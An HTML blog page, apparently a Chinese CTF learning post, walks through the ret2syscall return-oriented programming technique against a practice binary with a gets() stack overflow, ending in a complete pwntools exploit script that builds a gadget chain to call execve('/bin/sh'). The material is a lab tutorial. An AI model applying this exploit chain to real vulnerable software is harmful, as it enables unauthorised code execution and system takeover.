@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="Soul Attacker">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="基本ROP(三)ret2syscall">
+  <meta property="og:description" content="PWN JOURNEY">
+  <meta property="og:site_name" content="Soul Attacker PWN Time">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="Soul Attacker PWN Time" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>Soul Attacker PWN Time</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">基本ROP(三)ret2syscall</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/SoulAttacker">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:740196508@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By Soul Attacker</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-07-05</span>
+            <span class="time">20:41:38</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/PWN/">PWN</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/ROP/">#ROP</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<ul>
+<li>首先查看文件基本信息</li>
+</ul>
+<p><img src="/2019/07/05/基本ROP-3/basic_info.png" alt="imag"></p>
+<ul>
+<li><p>查看文件保护机制(开启了NX)<img src="/2019/07/05/基本ROP-3/protect_info.png" alt="imag"></p>
+</li>
+<li><p>放到 IDA 里面看main函数</p>
+</li>
+</ul>
+<p><img src="/2019/07/05/基本ROP-3/ida_main_info.png" alt="imag"></p>
+<p>由gets()函数可以看到栈溢出漏洞，接下来就是计算溢出大小</p>
+<ul>
+<li>cyclic 辅助计算溢出大小(112)</li>
+</ul>
+<p><img src="/2019/07/05/基本ROP-3/overflow_info.png" alt="imag"></p>
+<ul>
+<li>因为分析可知该program没有可以直接利用的shell代码而且NX不能自己填写shell代码，所以我们利用程序中的 gadgets 来获得 shell。只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure>
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 <code>gadgets</code>。比如说，现在栈顶是 10，那么如果此时执行了 <code>pop eax</code>，那么现在 <code>eax</code> 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 <code>gadgets</code> 最后使用 <code>ret</code> 来再次控制程序执行流程的原因。具体寻找 <code>gadgets</code> 的方法，我们可以使用 <code>ropgadgets</code> 这个工具。</p>
+<ol>
+<li>首先，我们来寻找控制 eax 的 gadgets(选第二个)</li>
+</ol>
+<p><img src="/2019/07/05/基本ROP-3/rop_gadget_info.png" alt="imag"></p>
+<ol start="2">
+<li>然后，找 ebx 的 gadgets<code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code>(直接控制其他三个XD)</li>
+</ol>
+<p><img src="/2019/07/05/基本ROP-3/rop_gadget_info_ebx.png" alt="imag"></p>
+<ol start="3">
+<li>其次，寻找shell_string </li>
+</ol>
+<p><img src="/2019/07/05/基本ROP-3/rop_gadget_string_info.png" alt="imag"></p>
+<ol start="4">
+<li>最后找到<code>int 0x80</code>地址(悄悄地说 我查<code>int 0x80</code>查不出来)</li>
+</ol>
+<p><img src="/2019/07/05/基本ROP-3/rop_gadget_int_info.png" alt="imag"></p>
+<ul>
+<li>ok~ 信息搜集完毕构造payload</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">binsh = <span class="number">0x080be408</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"A"</span>*<span class="number">112</span></span><br><span class="line">shellcode += p32(pop_eax_ret)</span><br><span class="line">shellcode += p32(<span class="number">0xb</span>)	<span class="comment">#0xb 为系统调用号</span></span><br><span class="line">shellcode += p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">shellcode += p32(<span class="number">0x0</span>)</span><br><span class="line">shellcode += p32(<span class="number">0x0</span>)</span><br><span class="line">shellcode += p32(binsh)</span><br><span class="line">shellcode += p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/07/05/基本ROP-3/shell.png" alt="imag"></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
